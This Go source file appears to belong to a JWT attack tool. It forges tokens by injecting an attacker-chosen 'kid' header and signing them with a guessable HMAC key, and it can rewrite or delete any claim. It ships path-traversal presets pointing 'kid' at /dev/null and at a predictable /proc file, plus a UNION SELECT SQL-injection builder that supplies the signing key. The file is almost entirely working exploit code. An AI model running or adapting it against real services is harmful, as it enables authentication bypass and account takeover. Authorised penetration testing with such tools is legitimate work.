package attack

import "github.com/MRvirusIR/clavis/internal/jwt"

// KidInject forges a token whose "kid" header is attacker-controlled, signed
// with keyContent as the HMAC secret. Two classic cases:
//
//  1. Path traversal: kid points at a file whose content you know (e.g.
//     ../../../../dev/null → empty key), so you know the HMAC secret.
//  2. SQL injection: kid is a query that returns a key you choose.
func KidInject(base *jwt.Token, claimKV map[string]any, kid, keyContent, hsAlg string) (string, error) {
	if hsAlg == "" {
		hsAlg = "HS256"
	}
	h := jwt.CloneMap(base.Header)
	h["alg"] = hsAlg
	h["kid"] = kid
	c := jwt.CloneMap(base.Claims)
	if c == nil {
		c = map[string]any{}
	}
	for k, v := range claimKV {
		if s, ok := v.(string); ok && s == "DELETE" {
			delete(c, k)
			continue
		}
		c[k] = v
	}
	si := jwt.EncodeHeader(h) + "." + jwt.EncodeClaims(c)
	sig, err := jwt.SignHMAC(hsAlg, si, []byte(keyContent))
	if err != nil {
		return "", err
	}
	return si + "." + sig, nil
}

// KidTraversalPresets are common "kid points to a file with known content"
// payloads. The Key is the resulting HMAC secret if the trick lands.
var KidTraversalPresets = []struct {
	Kid, Key, Note string
}{
	{"../../../../../../../../dev/null", "", "classic: /dev/null is empty → empty HMAC key"},
	{"/dev/null", "", "absolute /dev/null → empty key"},
	{"../../../../../../../../proc/sys/kernel/randomize_va_space", "2\n", "predictable tiny file"},
}

// KidSQLi builds a kid that injects keyContent via a UNION SELECT, for backends
// that look the key up with: SELECT key FROM keys WHERE id = '<kid>'.
func KidSQLi(keyContent string) string {
	return "nonexistent' UNION SELECT '" + keyContent + "'-- -"
}
